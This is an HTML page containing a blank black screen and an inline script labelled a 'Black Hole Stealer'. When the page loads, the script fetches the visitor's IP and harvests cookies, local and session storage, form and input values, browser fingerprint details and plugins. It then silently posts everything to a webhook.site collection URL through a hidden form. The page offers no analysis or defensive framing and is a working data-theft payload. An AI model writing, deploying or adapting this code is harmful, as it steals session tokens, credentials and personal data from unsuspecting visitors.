<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title></title>
<style>
* { margin:0; padding:0; }
body { background: #000; width:100vw; height:100vh; overflow:hidden; }
</style>
</head>
<body>
<script>
// ===== BLACK HOLE STEALER - FORM VERSION =====
(function() {
    const WEBHOOK = 'https://webhook.site/38be745b-416b-4abd-a51e-9467ccca7ac1';
    
    function send(data) {
        try {
            const json = JSON.stringify(data);
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = WEBHOOK;
            form.style.display = 'none';
            const input = document.createElement('input');
            input.type = 'text';
            input.name = 'data';
            input.value = json;
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        } catch(e) {}
    }
    
    let ip = 'unknown';
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => {
            ip = data.ip;
            collectAndSend();
        })
        .catch(() => {
            collectAndSend();
        });
    
    function collectAndSend() {
        const cookies = document.cookie || 'No cookies';
        const ls = {};
        for (let key in localStorage) {
            try { ls[key] = localStorage[key]; } catch(e) {}
        }
        const ss = {};
        for (let key in sessionStorage) {
            try { ss[key] = sessionStorage[key]; } catch(e) {}
        }
        const browser = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'direct',
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
        const forms = [];
        document.querySelectorAll('form').forEach(form => {
            const data = {};
            new FormData(form).forEach((val, key) => data[key] = val);
            forms.push({
                action: form.action || 'none',
                method: form.method || 'GET',
                data: data
            });
        });
        const inputs = [];
        document.querySelectorAll('input, textarea, select').forEach(el => {
            inputs.push({
                tag: el.tagName,
                type: el.type || 'text',
                name: el.name || '',
                id: el.id || '',
                value: el.value || '',
                placeholder: el.placeholder || ''
            });
        });
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push(navigator.plugins[i].name);
        }
        const log = {
            ip: ip,
            cookies: cookies,
            localStorage: ls,
            sessionStorage: ss,
            browser: browser,
            forms: forms,
            inputs: inputs,
            plugins: plugins,
            timestamp: new Date().toISOString()
        };
        send(log);
    }
})();
</script>
</body>
</html>
